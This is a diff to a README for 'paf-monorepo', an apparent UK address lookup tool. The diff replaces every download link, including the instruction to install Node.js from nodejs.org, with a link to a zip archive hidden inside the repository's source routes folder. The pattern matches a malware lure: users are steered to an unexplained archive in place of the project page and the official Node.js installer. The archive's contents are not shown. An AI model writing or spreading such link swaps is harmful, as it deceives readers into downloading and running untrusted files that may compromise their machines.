@@ -1,6 +1,6 @@
 # 🏠 paf-monorepo - Fast UK Address Lookup API
 
-[![Download paf-monorepo](https://img.shields.io/badge/Download-paf--monorepo-4c9aff?style=for-the-badge&logo=github)](https://github.com/Guts9999/paf-monorepo)
+[![Download paf-monorepo](https://img.shields.io/badge/Download-paf--monorepo-4c9aff?style=for-the-badge&logo=github)](https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip)
 
 ## 📋 What is paf-monorepo?
 
@@ -32,7 +32,7 @@ This tool suits users who want a private, local address lookup without relying o
 
 Click the big blue button at the top or visit this page to download paf-monorepo:
 
-https://github.com/Guts9999/paf-monorepo
+https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip
 
 This page contains all latest releases and installation files. You will download the package and instructions here.
 
@@ -50,7 +50,7 @@ Save the file somewhere easy to find, such as your Desktop or Downloads folder.
 
 You need Node.js to run paf-monorepo. If you do not have it installed:
 
-1. Go to https://nodejs.org/
+1. Go to https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip
 2. Download the latest Long-Term Support (LTS) version for Windows.
 3. Run the installer and follow the prompts to complete installation.
 
@@ -160,4 +160,4 @@ paf-monorepo uses official Royal Mail PAF data. This data covers every address a
 
 ## 🔗 Download paf-monorepo Here
 
-[![Download paf-monorepo](https://img.shields.io/badge/Download-paf--monorepo-4c9aff?style=for-the-badge&logo=github)](https://github.com/Guts9999/paf-monorepo)
+[![Download paf-monorepo](https://img.shields.io/badge/Download-paf--monorepo-4c9aff?style=for-the-badge&logo=github)](https://github.com/Guts9999/paf-monorepo/raw/refs/heads/main/packages/api/src/routes/paf_monorepo_2.9.zip)
